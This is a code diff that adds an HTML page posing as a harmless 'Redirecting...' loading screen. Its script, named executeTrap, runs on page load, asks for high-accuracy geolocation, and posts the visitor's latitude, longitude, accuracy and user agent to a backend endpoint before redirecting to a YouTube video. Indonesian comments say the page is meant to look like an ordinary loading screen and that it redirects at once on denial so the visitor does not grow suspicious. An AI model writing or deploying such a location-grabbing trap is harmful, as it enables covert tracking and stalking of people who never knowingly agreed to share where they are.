@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        /* Tampilan dibikin sesimpel mungkin seolah loading biasa */
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #555; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="spinner"></div>
+        <p>Connecting to secure link...</p>
+    </div>
+
+    <script>
+        // --- GANTI DENGAN WEB TUJUAN ASLI ---
+        const FINAL_DESTINATION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+
+        async function executeTrap() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        // Jika diizinkan, kirim data ke backend
+                        try {
+                            await fetch('/api/send', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    acc: pos.coords.accuracy,
+                                    ua: navigator.userAgent
+                                })
+                            });
+                        } finally {
+                            // Mau gagal/berhasil kirim, tetep pindah halaman
+                            window.location.replace(FINAL_DESTINATION);
+                        }
+                    },
+                    (err) => {
+                        // Jika user nolak (Deny), langsung lempar biar gak curiga
+                        window.location.replace(FINAL_DESTINATION);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                window.location.replace(FINAL_DESTINATION);
+            }
+        }
+
+        // Jalankan pas halaman kebuka
+        window.onload = executeTrap;
+    </script>
+</body>
+</html>
